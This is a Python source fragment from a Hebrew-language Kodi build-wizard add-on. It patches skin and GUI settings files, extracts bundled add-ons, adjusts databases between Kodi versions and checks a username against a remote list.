	if xbmc.getCondVisibility("Window.isVisible(yesnodialog)"):
		xbmc.executebuiltin('SendClick(11)')
	return True

def getOld(old):
	try:
		old = '"%s"' % old 
		query = '{"jsonrpc":"2.0", "method":"Settings.GetSettingValue","params":{"setting":%s}, "id":1}' % (old)
		
		response = xbmc.executeJSONRPC(query)
		response = simplejson.loads(response)
		if response.has_key('result'):
			if response['result'].has_key('value'):
				return response ['result']['value'] 
	except:
		pass
	return None
    
    
def setNew(new, value):
	try:
		new = '"%s"' % new
		value = '"%s"' % value
		query = '{"jsonrpc":"2.0", "method":"Settings.SetSettingValue","params":{"setting":%s,"value":%s}, "id":1}' % (new, value)

		response = xbmc.executeJSONRPC(query)
	except:
		pass
	return None  
def fixskin():
    # swapSkins('skin.Premium.mod')
    if KODIV>=17 and KODIV<18:
    
        src=os.path.join(xbmc.translatePath("special://home/"),"addons","plugin.program.Anonymous","skinfix","17","guisettings.xml")
        dst=os.path.join(xbmc.translatePath("special://home/"),"userdata","guisettings.xml")
  
        copyfile(src,dst)
        
        
        src=os.path.join(xbmc.translatePath("special://home/"),"addons","plugin.program.Anonymous","skinfix","17","settings.xml")
        dst=os.path.join(xbmc.translatePath("special://home/"),"userdata","addon_data","skin.Premium.mod","settings.xml")
  
        copyfile(src,dst)
        
        
                
        xbmcgui.Dialog().ok("Kodi Anonymous", 'אופס, נראה שהייתה תקלה, לחץ אישור לתיקון הבעיה :)')
        os._exit(1)
    if KODIV>=18:

        src=os.path.join(xbmc.translatePath("special://home/"),"addons","plugin.program.Anonymous","skinfix","18","guisettings.xml")
        dst=os.path.join(xbmc.translatePath("special://home/"),"userdata","guisettings.xml")
      
        copyfile(src,dst)
                
        src=os.path.join(xbmc.translatePath("special://home/"),"addons","plugin.program.Anonymous","skinfix","17","settings.xml")
        dst=os.path.join(xbmc.translatePath("special://home/"),"userdata","addon_data","skin.Premium.mod","settings.xml")
  
        copyfile(src,dst)
        
        xbmcgui.Dialog().ok("Kodi Anonymous", 'אופס, נראה שהייתה תקלה, לחץ אישור לתיקון הבעיה :)')
        os._exit(1)


        
        
        
wiz.log("[Installed Check] Started", xbmc.LOGNOTICE)
#if INSTALLED == 'false':
#	if KODIV >= 17 and SKIN in ['skin.confluence', 'skin.estuary'] and BUILDNAME == '':
#			swapSkins('skin.Premium.mod')
if SKIN in ['skin.confluence', 'skin.estuary', 'skin.estouchy'] and not BUILDNAME == "":
			# wiz.kodi17Fix()
			# fix18update()
			# fix17update()
            fixskin()

wiz.log("[Auto Update Wizard] Started", xbmc.LOGNOTICE)
if AUTOUPDATE == 'Yes':
	input= (ADDON.getSetting("autoupdate"))
	xbmc.executebuiltin("UpdateLocalAddons")
	xbmc.executebuiltin("UpdateAddonRepos")
	if BUILDNAME == " Kodi Premium":
		wiz.wizardUpdate('startup')
	if BUILDNAME == "":
		wiz.wizardUpdateDP('startup')
	# checkUpdate()
#	if input == 'true': fastupdatefirstbuild(NOTEID)
if not os.path.exists(xbmc.translatePath("special://home/addons/") + 'script.module.requests'):
    wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE),'[COLOR %s]אנא המתן...[/COLOR]' % COLOR2)

    setting_file=os.path.join(xbmc.translatePath("special://home/"),"addons","plugin.program.Anonymous","request","request.zip")
    src=os.path.join(xbmc.translatePath("special://home/"),"addons")

    
    extract.all(setting_file,src)

    wiz.kodi17Fix()
if not os.path.exists(xbmc.translatePath("special://home/addons/") + 'skin.estuary'):
    wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE),'[COLOR %s]אנא המתן...[/COLOR]' % COLOR2)

    setting_file=os.path.join(xbmc.translatePath("special://home/"),"addons","plugin.program.Anonymous","skin","packages1.zip")
    src=os.path.join(xbmc.translatePath("special://home/"),"addons/skin.estuary")

    
    extract.all(setting_file,src)
    
    # setting_filez=os.path.join(xbmc.translatePath("special://home/"),"addons","plugin.program.Anonymous","skin","versioncheck.zip")
    # srcz=os.path.join(xbmc.translatePath("special://userdata/"),"addon_data/service.xbmc.versioncheck")

    
    # extract.all(setting_filez,srcz)
    # Addon = xbmcaddon.Addon('service.xbmc.versioncheck')
    # Addon.setSetting('versioncheck_enable','false')
    
    
    
    wiz.kodi17Fix()

    if KODIV>=18:

        setting_file=os.path.join(xbmc.translatePath("special://home/"),"addons","skin.estuary","addon.xml")
        with open(setting_file, 'r') as file :
          filedata = file.read()

    # Replace the target string
        filedata = filedata.replace('''<?xml version="1.0" encoding="UTF-8"?>
<addon id="skin.estuary" version="9.9.9" name="Estuary" provider-name="phil65, Ichabod Fletchman">
	<requires>
		<!-- <import addon="xbmc.gui" version="5.12.0"/> -->
	</requires>
	<extension point="xbmc.gui.skin" debugging="false" effectslowdown="1.0">
		<res width="1280" height="720" aspect="16:9" default="true" folder="720p" />
	</extension>
	<extension point="xbmc.addon.metadata">

		<platform>all</platform>
		<license>GNU General Public License version 2</license>
		<forum>http://forum.kodi.tv/forumdisplay.php?fid=125</forum>
		<website/>
		<email/>
		<source>https://github.com/xbmc/skin.confluence</source>
		<assets>
			<icon>resources/icon.png</icon>
			<fanart>resources/fanart.jpg</fanart>
		</assets>
		<news>Updated language files</news>
	</extension>
</addon>
''', '''<?xml version="1.0" encoding="UTF-8"?>
<addon id="skin.estuary" version="9.9.9" name="Estuary" provider-name="phil65, Ichabod Fletchman">
	<requires>
		<!-- <import addon="xbmc.gui" version="5.14.0"/> -->
	</requires>
	<extension point="xbmc.gui.skin" debugging="false" effectslowdown="1.0">
		<res width="1280" height="720" aspect="16:9" default="true" folder="720p" />
	</extension>
	<extension point="xbmc.addon.metadata">

		<platform>all</platform>
		<license>GNU General Public License version 2</license>
		<forum>http://forum.kodi.tv/forumdisplay.php?fid=125</forum>
		<website/>
		<email/>
		<source>https://github.com/xbmc/skin.confluence</source>
		<assets>
			<icon>resources/icon.png</icon>
			<fanart>resources/fanart.jpg</fanart>
		</assets>
		<news>Updated language files</news>
	</extension>
</addon>
''')

    # Write the file out again
        with open(setting_file, 'w') as file:
          file.write(filedata)
          
          
          
          
          
        setting_file=os.path.join(xbmc.translatePath("special://home/"),"addons","skin.estuary","720p","DialogAddonSettings.xml")
        with open(setting_file, 'r') as file :
          filedata = file.read()

    # Replace the target string
        filedata = filedata.replace('''<?xml version="1.0" encoding="UTF-8"?>
<window>
	<defaultcontrol always="true">2</defaultcontrol>
	<coordinates>
		<left>240</left>
		<top>60</top>
	</coordinates>
	<include>dialogeffect</include>
	<controls>
		<include content="DialogBackgroundCommons">
			<param name="DialogBackgroundWidth" value="800" />
			<param name="DialogBackgroundHeight" value="600" />
			<param name="DialogHeaderWidth" value="720" />
			<param name="DialogHeaderLabel" value="-" />
			<param name="DialogHeaderId" value="20" />
			<param name="CloseButtonLeft" value="710" />
			<param name="CloseButtonNav" value="3" />
		</include>
		<control type="grouplist" id="99">
			<description>button area</description>
			<left>45</left>
			<top>70</top>
			<width>710</width>
			<height>40</height>
			<itemgap>5</itemgap>
			<align>center</align>
			<orientation>horizontal</orientation>
			<onleft>9</onleft>
			<onright>9</onright>
			<onup>2</onup>
			<ondown>2</ondown>
		</control>
		<control type="image">
			<description>Has Previous</description>
			<left>25</left>
			<top>80</top>
			<width>20</width>
			<height>20</height>
			<texture>scroll-left-focus.png</texture>
			<visible>Container(9).HasPrevious</visible>
		</control>
		<control type="image">
			<description>Has Next</description>
			<left>755</left>
			<top>80</top>
			<width>20</width>
			<height>20</height>
			<texture>scroll-right-focus.png</texture>
			<visible>Container(9).HasNext</visible>
		</control>
		<control type="grouplist" id="2">
			<description>control area</description>
			<left>40</left>
			<top>120</top>
			<width>720</width>
			<height>380</height>
			<itemgap>5</itemgap>
			<pagecontrol>30</pagecontrol>
			<onup>9</onup>
			<ondown>9001</ondown>
			<onleft>2</onleft>
			<onright>30</onright>
		</control>
		<control type="scrollbar" id="30">
			<left>765</left>
			<top>120</top>
			<width>25</width>
			<height>380</height>
			<texturesliderbackground border="0,14,0,14">ScrollBarV.png</texturesliderbackground>
			<texturesliderbar border="2,16,2,16">ScrollBarV_bar.png</texturesliderbar>
			<texturesliderbarfocus border="2,16,2,16">ScrollBarV_bar_focus.png</texturesliderbarfocus>
			<textureslidernib>ScrollBarNib.png</textureslidernib>
			<textureslidernibfocus>ScrollBarNib.png</textureslidernibfocus>
			<onleft>2</onleft>
			<onright>2</onright>
			<showonepage>false</showonepage>
			<orientation>vertical</orientation>
		</control>
		<control type="group" id="9001">
			<top>535</top>
			<left>190</left>
			<control type="button" id="10">
				<description>OK Button</description>
				<left>0</left>
				<top>0</top>
				<width>200</width>
				<height>40</height>
				<align>center</align>
				<aligny>center</aligny>
				<font>font12_title</font>
				<label>186</label>
				<onleft>12</onleft>
				<onright>11</onright>
				<onup>2</onup>
				<ondown>2</ondown>
			</control>
			<control type="button" id="11">
				<description>Cancel Button</description>
				<left>210</left>
				<top>0</top>
				<width>200</width>
				<height>40</height>
				<align>center</align>
				<aligny>center</aligny>
				<font>font12_title</font>
				<label>222</label>
				<onleft>10</onleft>
				<onright>12</onright>
				<onup>2</onup>
				<ondown>2</ondown>
			</control>
<!-- 			<control type="button" id="12">
				<description>Defaults Button</description>
				<left>420</left>
				<top>0</top>
				<width>200</width>
				<height>40</height>
				<align>center</align>
				<aligny>center</aligny>
				<font>font12_title</font>
				<label>409</label>
				<onleft>11</onleft>
				<onright>10</onright>
				<onup>2</onup>
				<ondown>2</ondown>
			</control> -->
		</control>
		<control type="button" id="13">
			<description>Default Category Button</description>
			<height>40</height>
			<width>173</width>
			<align>center</align>
			<aligny>center</aligny>
			<font>font12_title</font>
			<textcolor>white</textcolor>
			<pulseonselect>false</pulseonselect>
		</control>
		<control type="button" id="3">
			<description>Default Button</description>
			<height>40</height>
			<font>font13</font>
			<textcolor>grey2</textcolor>
			<focusedcolor>white</focusedcolor>
			<texturefocus border="5">button-focus2.png</texturefocus>
		</control>
		<control type="radiobutton" id="4">
			<description>Default RadioButton</description>
			<height>40</height>
			<font>font13</font>
			<textwidth>668</textwidth>
			<textcolor>grey2</textcolor>
			<focusedcolor>white</focusedcolor>
			<texturefocus border="5">button-focus2.png</texturefocus>
		</control>
		<control type="spincontrolex" id="5">
			<description>Default spincontrolex</description>
			<height>40</height>
			<textcolor>grey2</textcolor>
			<focusedcolor>white</focusedcolor>
			<texturenofocus border="5">button-nofocus.png</texturenofocus>
			<texturefocus border="5">button-focus2.png</texturefocus>
			<font>font13</font>
			<aligny>center</aligny>
			<reverse>yes</reverse>
		</control>
		<control type="label" id="7">
			<height>35</height>
			<font>font13_title</font>
			<label>-</label>
			<textcolor>blue</textcolor>
			<shadowcolor>black</shadowcolor>
			<align>right</align>
			<aligny>center</aligny>
		</control>
		<control type="image" id="6">
			<description>Default Seperator</description>
			<height>2</height>
			<texture>separator2.png</texture>
		</control>
		<control type="sliderex" id="8">
			<description>Default Slider</description>
			<height>40</height>
			<font>font13</font>
			<textwidth>518</textwidth>
			<textcolor>grey2</textcolor>
			<focusedcolor>white</focusedcolor>
			<texturefocus border="5">button-focus2.png</texturefocus>
		</control>
	</controls>
</window>
''', '''<?xml version="1.0" encoding="UTF-8"?>
<window>
	<defaultcontrol always="true">5</defaultcontrol>
	<coordinates>
		<left>240</left>
		<top>60</top>
	</coordinates>
	<include>dialogeffect</include>
	<controls>
		<include content="DialogBackgroundCommons">
			<param name="DialogBackgroundWidth" value="800" />
			<param name="DialogBackgroundHeight" value="600" />
			<param name="DialogHeaderWidth" value="720" />
			<param name="DialogHeaderLabel" value="" />
			<param name="DialogHeaderId" value="2" />
			<param name="CloseButtonLeft" value="710" />
			<param name="CloseButtonNav" value="3" />
		</include>
		<control type="grouplist" id="3">
			<description>button area</description>
			<left>45</left>
			<top>70</top>
			<width>710</width>
			<height>40</height>
			<itemgap>5</itemgap>
			<align>center</align>
			<orientation>horizontal</orientation>
			<onleft>3</onleft>
			<onright>3</onright>
			<onup>5</onup>
			<ondown>5</ondown>
		</control>
			<control type="button" id="10">
			<description>Default Button</description>
			<height>40</height>
			<font>font13</font>
			<textcolor>grey2</textcolor>
			<focusedcolor>white</focusedcolor>
			<texturefocus border="5">button-focus2.png</texturefocus>
			</control>
		<control type="image">
			<description>Has Previous</description>
			<left>25</left>
			<top>80</top>
			<width>20</width>
			<height>20</height>
			<texture>scroll-left-focus.png</texture>
			<visible>Container(3).HasPrevious</visible>
		</control>
		<control type="image">
			<description>Has Next</description>
			<left>755</left>
			<top>80</top>
			<width>20</width>
			<height>20</height>
			<texture>scroll-right-focus.png</texture>
			<visible>Container(3).HasNext</visible>
		</control>
		<control type="grouplist" id="5">
			<description>control area</description>
			<left>40</left>
			<top>120</top>
			<width>720</width>
			<height>380</height>
			<itemgap>5</itemgap>
			<pagecontrol>30</pagecontrol>
			<onup>3</onup>
			<ondown>9001</ondown>
			<onleft>2</onleft>
			<onright>30</onright>
		</control>
		<control type="scrollbar" id="30">
			<left>765</left>
			<top>120</top>
			<width>25</width>
			<height>380</height>
			<texturesliderbackground border="0,14,0,14">ScrollBarV.png</texturesliderbackground>
			<texturesliderbar border="2,16,2,16">ScrollBarV_bar.png</texturesliderbar>
			<texturesliderbarfocus border="2,16,2,16">ScrollBarV_bar_focus.png</texturesliderbarfocus>
			<textureslidernib>ScrollBarNib.png</textureslidernib>
			<textureslidernibfocus>ScrollBarNib.png</textureslidernibfocus>
			<onleft>2</onleft>
			<onright>2</onright>
			<showonepage>false</showonepage>
			<orientation>vertical</orientation>
		</control>
		<control type="group" id="9001">
			<top>535</top>
			<left>190</left>
			<control type="button" id="28">
				<description>OK Button</description>
				<left>0</left>
				<top>0</top>
				<width>200</width>
				<height>40</height>
				<align>center</align>
				<aligny>center</aligny>
				<font>font12_title</font>
				<label>186</label>
				<onleft>28</onleft>
				<onright>29</onright>
				<onup>5</onup>
				<ondown>5</ondown>
			</control>
			<control type="button" id="29">
				<description>Cancel Button</description>
				<left>210</left>
				<top>0</top>
				<width>200</width>
				<height>40</height>
				<align>center</align>
				<aligny>center</aligny>
				<font>font12_title</font>
				<label>222</label>
				<onleft>28</onleft>
				<onright>29</onright>
				<onup>5</onup>
				<ondown>5</ondown>
			</control>
<!-- 			<control type="button" id="12">
				<description>Defaults Button</description>
				<left>420</left>
				<top>0</top>
				<width>200</width>
				<height>40</height>
				<align>center</align>
				<aligny>center</aligny>
				<font>font12_title</font>
				<label>409</label>
				<onleft>11</onleft>
				<onright>10</onright>
				<onup>2</onup>
				<ondown>2</ondown>
			</control> -->
		</control>
		<control type="button" id="10">
			<description>Default Category Button</description>
			<height>40</height>
			<width>173</width>
			<align>center</align>
			<aligny>center</aligny>
			<font>font12_title</font>
			<textcolor>white</textcolor>
			<pulseonselect>false</pulseonselect>
		</control>
		<control type="button" id="7">
			<description>Default Button</description>
			<height>40</height>
			<font>font13</font>
			<textcolor>grey2</textcolor>
			<focusedcolor>white</focusedcolor>
			<texturefocus border="5">button-focus2.png</texturefocus>
		</control>
		<control type="radiobutton" id="8">
			<description>Default RadioButton</description>
			<height>40</height>
			<font>font13</font>
			<textwidth>668</textwidth>
			<textcolor>grey2</textcolor>
			<focusedcolor>white</focusedcolor>
			<texturefocus border="5">button-focus2.png</texturefocus>
		</control>
		<control type="spincontrolex" id="9">
			<description>Default spincontrolex</description>
			<height>40</height>
			<textcolor>grey2</textcolor>
			<focusedcolor>white</focusedcolor>
			<texturenofocus border="5">button-nofocus.png</texturenofocus>
			<texturefocus border="5">button-focus2.png</texturefocus>
			<font>font13</font>
			<aligny>center</aligny>
			<reverse>yes</reverse>
		</control>
		<control type="label" id="14">
			<height>35</height>
			<font>font13_title</font>
			<label>-</label>
			<textcolor>blue</textcolor>
			<shadowcolor>black</shadowcolor>
			<align>right</align>
			<aligny>center</aligny>
		</control>
		<control type="image" id="11">
			<description>Default Seperator</description>
			<height>2</height>
			<texture>separator2.png</texture>
		</control>
		<control type="sliderex" id="13">
			<description>Default Slider</description>
			<height>40</height>
			<font>font13</font>
			<textwidth>518</textwidth>
			<textcolor>grey2</textcolor>
			<focusedcolor>white</focusedcolor>
			<texturefocus border="5">button-focus2.png</texturefocus>
		</control>
	</controls>
</window>
''')

    # Write the file out again
        with open(setting_file, 'w') as file:
          file.write(filedata)
    # wiz.forceUpdate(True)
    


    
    
    
    wiz.log("[Auto Install Repo] Successfully Installed", xbmc.LOGNOTICE)
    xbmc.executebuiltin("ReloadSkin()")
    xbmc.executebuiltin( "ActivateWindow(home)" )
    # f_play=(os.path.join(ADDONPATH, 'resources', 'victory.mp4')) בוטל זמני
    # xbmc.Player().play(f_play,windowed=False)
# if not os.path.exists(xbmc.translatePath("special://home/addons/") + 'skin.Premium.mod'):
   # if not os.path.exists(os.path.join(ADDONDATA, '4.4.0')):
    # f_play=(os.path.join(ADDONPATH, 'resources', 'victory.mp4'))
    # xbmc.Player().play(f_play,windowed=False)
    # file = open(os.path.join(ADDONDATA, '4.4.0'), 'w') 
     
    # file.write(str('Done'))
    # file.close()


# if AUTOINSTALL == 'Yes' and not os.path.exists(os.path.join(ADDONS, REPOID)) and KODIV>=17 and KODIV<18:
	# #xbmc.executebuiltin((u'Notification(%s,%s)' % ('Kodi Anonymous', 'Please Wait....')))
	# wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE),'[COLOR %s]אנא המתן...[/COLOR]' % COLOR2)
	# workingxml = wiz.workingURL(REPOADDONXML)
	# if workingxml == True:
		# ver = wiz.parseDOM(wiz.openURL(REPOADDONXML), 'addon', ret='version', attrs = {'id': REPOID})
		# if len(ver) > 0:
			# installzip = '%s-%s.zip' % (REPOID, ver[0])
			# workingrepo = wiz.workingURL(REPOZIPURL+installzip)
			# if workingrepo == True:
				# DP.create(ADDONTITLE,'מוריד ממשק התקנה חדשני, אנא המתן....','', 'Please Wait')
				# if not os.path.exists(PACKAGES): os.makedirs(PACKAGES)
				# lib=os.path.join(PACKAGES, installzip)
				# try: os.remove(lib)
				# except: pass
				# downloader.download(REPOZIPURL+installzip,lib, DP)
				# extract.all(lib, ADDONS, DP)
				# try:
					# f = open(os.path.join(ADDONS, REPOID, 'addon.xml'), mode='r'); g = f.read(); f.close()
					# name = wiz.parseDOM(g, 'addon', ret='name', attrs = {'id': REPOID})
					# wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, name[0]), "[COLOR %s]Add-on updated[/COLOR]" % COLOR2, icon=os.path.join(ADDONS, REPOID, 'icon.png'))
				# except:
					# pass
				# if KODIV >= 17: wiz.addonDatabase(REPOID, 1)
				# DP.close()
				# xbmc.sleep(500)
				# wiz.forceUpdate(True)
				# wiz.log("[Auto Install Repo] Successfully Installed", xbmc.LOGNOTICE)
				# xbmc.executebuiltin("ReloadSkin()")
				# xbmc.executebuiltin( "ActivateWindow(home)" )
				# f_play=(os.path.join(ADDONPATH, 'resources', 'victory.mp4'))
				# xbmc.Player().play(f_play,windowed=False)
				# #xbmc.executebuiltin( "XBMC.Action(Fullscreen)" )
			# else: 
				# wiz.LogNotify("[COLOR %s]Repo Install Error[/COLOR]" % COLOR1, "[COLOR %s]Invalid url for zip![/COLOR]" % COLOR2)
				# wiz.log("[Auto Install Repo] Was unable to create a working url for repository. %s" % workingrepo, xbmc.LOGERROR)
		# else:
			# wiz.log("Invalid URL for Repo Zip", xbmc.LOGERROR)
	# else: 
		# wiz.LogNotify("[COLOR %s]Repo Install Error[/COLOR]" % COLOR1, "[COLOR %s]Invalid addon.xml file![/COLOR]" % COLOR2)
		# wiz.log("[Auto Install Repo] Unable to read the addon.xml file.", xbmc.LOGERROR)


# if AUTOINSTALL == 'Yes' and not os.path.exists(os.path.join(ADDONS, REPOID)) and KODIV>=18:
	# workingxml = wiz.workingURL(REPOADDONXML18)
	# wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE),'[COLOR %s]אנא המתן...[/COLOR]' % COLOR2)
	# if BUILDNAME == "":
		# try:
			# os.remove(os.path.join(xbmc.translatePath("special://userdata/"),"Database", "MyVideos116.db"))
		# except:
				# pass
	# if workingxml == True:
		# ver = wiz.parseDOM(wiz.openURL(REPOADDONXML18), 'addon', ret='version', attrs = {'id': REPOID18})
		# if len(ver) > 0:
			# installzip = '%s-%s.zip' % (REPOID18, ver[0])
			# workingrepo = wiz.workingURL(REPOZIPURL18+installzip)
			# if workingrepo == True:
				# DP.create(ADDONTITLE,'מוריד ממשק התקנה חדשני, אנא המתן....','', 'Please Wait')
				# if not os.path.exists(PACKAGES): os.makedirs(PACKAGES)
				# lib=os.path.join(PACKAGES, installzip)
				# try: os.remove(lib)
				# except: pass
				# downloader.download(REPOZIPURL18+installzip,lib, DP)
				# extract.all(lib, ADDONS, DP)
				# try:
					# f = open(os.path.join(ADDONS, REPOID18, 'addon.xml'), mode='r'); g = f.read(); f.close()
					# name = wiz.parseDOM(g, 'addon', ret='name', attrs = {'id': REPOID18})
					# wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, name[0]), "[COLOR %s]Add-on updated[/COLOR]" % COLOR2, icon=os.path.join(ADDONS, REPOID18, 'icon.png'))
				# except:
					# pass
				# if KODIV >= 17: wiz.addonDatabase(REPOID18, 1)
				# DP.close()
				# xbmc.sleep(500)
				# wiz.forceUpdate(True)
				# wiz.log("[Auto Install Repo] Successfully Installed", xbmc.LOGNOTICE)
				# xbmc.executebuiltin("ReloadSkin()")
				# xbmc.executebuiltin( "ActivateWindow(home)" )
				# f_play=(os.path.join(ADDONPATH, 'resources', 'victory.mp4'))
				# xbmc.Player().play(f_play,windowed=False)
				# #xbmc.executebuiltin( "XBMC.Action(Fullscreen)" )
			# else: 
				# wiz.LogNotify("[COLOR %s]Repo Install Error[/COLOR]" % COLOR1, "[COLOR %s]Invalid url for zip![/COLOR]" % COLOR2)
				# wiz.log("[Auto Install Repo] Was unable to create a working url for repository. %s" % workingrepo, xbmc.LOGERROR)
		# else:
			# wiz.log("Invalid URL for Repo Zip", xbmc.LOGERROR)
	# else: 
		# wiz.LogNotify("[COLOR %s]Repo Install Error[/COLOR]" % COLOR1, "[COLOR %s]Invalid addon.xml file![/COLOR]" % COLOR2)
		# wiz.log("[Auto Install Repo] Unable to read the addon.xml file.", xbmc.LOGERROR)
        
        
# elif not AUTOINSTALL == 'Yes': wiz.log("[Auto Install Repo] Not Enabled", xbmc.LOGNOTICE)
# elif os.path.exists(os.path.join(ADDONS, REPOID18)): wiz.log("[Auto Install Repo] Repository already installed")
        
        
# if AUTOINSTALL == 'Yes' and not os.path.exists(os.path.join(ADDONS, REQUESTSID)):
	# workingxml = wiz.workingURL(REQUESTSXML)

	# if workingxml == True:
		# ver = wiz.parseDOM(wiz.openURL(REQUESTSXML), 'addon', ret='version', attrs = {'id': REQUESTSID})
		# if len(ver) > 0:
			# installzip = '%s-%s.zip' % (REQUESTSID, ver[0])
			# workingrepo = wiz.workingURL(REQUESTSURL+installzip)
			# if workingrepo == True:
				# #DP.create(ADDONTITLE,'מוריד קבצי התקנה...','', 'Please Wait')
				# if not os.path.exists(PACKAGES): os.makedirs(PACKAGES)
				# lib=os.path.join(PACKAGES, installzip)
				# try: os.remove(lib)
				# except: pass
				# downloaderbg.download4(REQUESTSURL+installzip,lib, DP2)
				# DP2.create('[B][COLOR=green]מתקין                         [/COLOR][/B]')
				# DP2.update(100, message='[B][COLOR=silver]אנא המתן ...                    [/COLOR][/B]')
				# extract.all2(lib,ADDONS,DP2)
				# try:
					# f = open(os.path.join(ADDONS, REQUESTSID, 'addon.xml'), mode='r'); g = f.read(); f.close()
					# name = wiz.parseDOM(g, 'addon', ret='name', attrs = {'id': REQUESTSID})
					# wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, name[0]), "[COLOR %s]Add-on updated[/COLOR]" % COLOR2, icon=os.path.join(ADDONS, REQUESTSID, 'icon.png'))
				# except:
					# pass
				# if KODIV >= 17: wiz.addonDatabase(REQUESTSID, 1)
				# DP2.close()
				# xbmc.sleep(500)
				# wiz.forceUpdate(True)
				# wiz.kodi17Fix()



def setuname():
    search_entered=''
    keyboard = xbmc.Keyboard(search_entered, 'הכנס שם משתמש')
    keyboard.doModal()
    if keyboard.isConfirmed():
           search_entered = keyboard.getText()
           wiz.setS('user', str(search_entered))
def STARTP2():
	if BUILDNAME == " Kodi Premium":
		input= (ADDON.getSetting("user"))
		url = (UNAME)
		remote_file = urllib2.urlopen(url)
		x=remote_file.readlines()
		found=0
		for us in x:
			if us.split(' ==')[0] ==input or us.split()[0]==input:
				found=1
				break
		if found==0:

			yes = DIALOG.yesno("%s" % ADDONTITLE, "[COLOR %s]ברוכים הבאים לקודי אנונימוס" % (COLOR2), "נא להכניס את שם המשתמש שלכם[/COLOR]", nolabel='[B][COLOR white]ביטול[/COLOR][/B]',yeslabel='[B][COLOR green]אישור[/COLOR][/B]')

			if yes:
				ADDON.openSettings()
				sys.exit()
			else:
				sys.exit()
#	else:
#		xbmcgui.Dialog().ok('הקוד שלך','עבר')
#		sys.exit()
		return 'ok'


def skinWIN():
	idle()
	fold = glob.glob(os.path.join(ADDONS, 'skin*'))
	addonnames = []; addonids = []
	for folder in sorted(fold, key = lambda x: x):
		foldername = os.path.split(folder[:-1])[1]
		xml = os.path.join(folder, 'addon.xml')
		if os.path.exists(xml):
			f      = open(xml)
			a      = f.read()
			match  = parseDOM2(a, 'addon', ret='id')
			addid  = foldername if len(match) == 0 else match[0]
			try: 
				add = xbmcaddon.Addon(id=addid)
				addonnames.append(add.getAddonInfo('name'))
				addonids.append(addid)
			except:
				pass
	selected = []; choice = 0
	skin = ["Current Skin -- %s" % currSkin()] + addonnames
	choice = DIALOG.select("Select the Skin you want to swap with.", skin)
	if choice == -1: return
	else: 
		choice1 = (choice-1)
		selected.append(choice1)
		skin[choice] = "%s" % ( addonnames[choice1])
	if selected == None: return
	for addon in selected:
		swapSkins(addonids[addon])

def currSkin():
	return xbmc.getSkinDir('Container.PluginName')


def fix17update():
	if KODIV>=17 and KODIV<18:
		wiz.kodi17Fix()
		xbmc.sleep(4000)
		try:
			old_file = os.path.join(xbmc.translatePath("special://userdata/"),"Database", "MyVideos116.db")
			new_file = os.path.join(xbmc.translatePath("special://userdata/"),"Database", "MyVideos107.db")
			os.rename(old_file, new_file)
		except:
				pass
		xbmc.executeJSONRPC('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.language","value":"resource.language.he_il"}}')
		xbmc.executeJSONRPC('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"ntkl.ttf"}}')
		# fixfont()
		setting_file=os.path.join(xbmc.translatePath("special://home/"),"addons", "skin.Premium.mod","addon.xml")

		try:
			file = open(setting_file, 'r') 
			file_data= file.read()
			file.close()
			regex='<import addon="xbmc.gui" version="5.14.0(.+?)/>'
			m=re.compile(regex).findall(file_data)[0]
			file = open(setting_file, 'w') 
			file.write(file_data.replace('<import addon="xbmc.gui" version="5.14.0%s/>'%m,'<import addon="xbmc.gui" version="5.12.0"/>'))
			file.close()
		except:
				pass
		wiz.kodi17Fix()
		setting_file=os.path.join(xbmc.translatePath("special://userdata"),"guisettings.xml")
		try:
			file = open(setting_file, 'r') 
			file_data= file.read()
			file.close()
			regex='<keyboardlayouts default="true(.+?)/keyboardlayouts>'
			m=re.compile(regex).findall(file_data)[0]
			file = open(setting_file, 'w') 
			file.write(file_data.replace('<keyboardlayouts default="true%s/keyboardlayouts>'%m,'<keyboardlayouts>English QWERTY|Hebrew QWERTY</keyboardlayouts>'))
			file.close()
		except:
				pass
		swapSkins('skin.Premium.mod')
	xbmcgui.Dialog().ok("Kodi Anonymous Fix", 'גירסת הקודי אינה תואמת את גירסת הבילד, לתיקון הבעיה נא ללחוץ אישור. הקודי יסגר לאחר הפעולה.')
	os._exit(1)
def fix18update():
	if KODIV>=18:
		xbmc.sleep(4000)
		if BUILDNAME == "":
			try:
				os.remove(os.path.join(xbmc.translatePath("special://userdata/"),"Database", "MyVideos116.db"))
			except:
				pass
		try:
			old_file = os.path.join(xbmc.translatePath("special://userdata/"),"Database", "MyVideos107.db")
			new_file = os.path.join(xbmc.translatePath("special://userdata/"),"Database", "MyVideos116.db")
			os.rename(old_file, new_file)
		except:
				pass
		skindialogsettind18()
		xbmc.executeJSONRPC('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.language","value":"resource.language.he_il"}}')
		xbmc.executeJSONRPC('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"ntkl.ttf"}}')
		# fixfont()
		setting_file=os.path.join(xbmc.translatePath("special://home/"),"addons", "skin.Premium.mod","addon.xml")
		try:
			file = open(setting_file, 'r') 
			file_data= file.read()
			file.close()
			regex='<import addon="xbmc.gui" version="5.12.0(.+?)/>'
			m=re.compile(regex).findall(file_data)[0]
			file = open(setting_file, 'w') 
			file.write(file_data.replace('<import addon="xbmc.gui" version="5.12.0%s/>'%m,'<import addon="xbmc.gui" version="5.14.0"/>'))
			file.close()
		except:
				pass
		wiz.kodi17Fix()
		setting_file=os.path.join(xbmc.translatePath("special://userdata"),"guisettings.xml")
		try:
			file = open(setting_file, 'r') 
			file_data= file.read()
			file.close()
			regex='<setting id="locale.keyboardlayouts" default="true(.+?)/setting>'
			m=re.compile(regex).findall(file_data)[0]
			file = open(setting_file, 'w') 
			file.write(file_data.replace('<setting id="locale.keyboardlayouts" default="true%s/setting>'%m,'<setting id="locale.keyboardlayouts">English QWERTY|Hebrew QWERTY</setting>'))
			file.close()
		except:
				pass
		swapSkins('skin.Premium.mod')
